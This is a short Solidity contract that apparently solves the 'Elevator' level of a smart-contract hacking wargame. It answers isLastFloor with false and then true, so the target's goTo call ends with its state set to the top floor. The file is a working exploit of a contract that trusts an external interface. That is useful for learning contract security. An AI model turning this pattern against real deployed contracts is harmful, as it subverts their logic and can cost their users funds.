// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Level11 {
    address addr = 0x452Fe3AC4EC80FaC38eC46411654358F1197d35E;
    bool flag = false;

    function isLastFloor(uint256) external returns (bool) {
        if (!flag) {
            flag = true;
            return false;
        } else {
            flag = false;
            return true;
        }
    }

    function attack() public {
        (bool a,) = address(addr).call(abi.encodeWithSignature("goTo(uint256)", 1));
        require(a);
    }
}
